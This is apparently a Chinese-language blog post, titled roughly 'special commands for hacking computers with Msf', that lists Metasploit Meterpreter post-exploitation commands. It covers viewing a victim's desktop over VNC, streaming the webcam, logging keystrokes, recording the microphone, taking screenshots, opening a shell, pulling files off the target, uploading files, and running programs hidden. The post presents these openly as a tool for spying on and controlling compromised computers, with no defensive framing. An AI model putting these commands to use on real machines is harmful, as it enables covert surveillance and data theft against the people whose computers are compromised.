---
layout: post
title: '在Msf黑电脑的专用命令'
subtitle: 'Metasploit'
tags: linux 命令 shell
keywords: Msf Metasploit shell 黑电脑 专用
cover: https://coding.net/u/SunbossRS/p/GotBlogDowner/git/raw/master/img/MsfCmd/cover.jpg
---
### 使用vnc查看桌面
```msf
run vnc
```
### 监视摄像头
```msf
webcam_stream
```
### 监视键盘按下内容  
```msf
keyscan_start
//开启键盘记录
keyscan_dump
//显示键盘输入内容
keyscan_stop
//停止键盘记录
```
### 录制声音
```msf
record -d xx
//录制音频xx秒
record_mic
//录制音频
```
### 截屏
```msf
screenshot
```
### 进入cmd
```msf
shell
```
### 从目标机器下载东西
```msf
download C:\\path\\to\\file
```
### 从kali上传内容到目标机器
```msf
upload ~/file C:\\path\\up\\
```
### 查看有几个摄像头
```msf
webcam_list
```
### 运行程序
```msf
execute -f 文件名
//运行文件
execute -f -H 文件名
//隐秘的运行应用
execute -i -f -H 文件名
//隐秘的交互进行应用,当文件名为cmd时meterpreter命令行会变成cmd
```
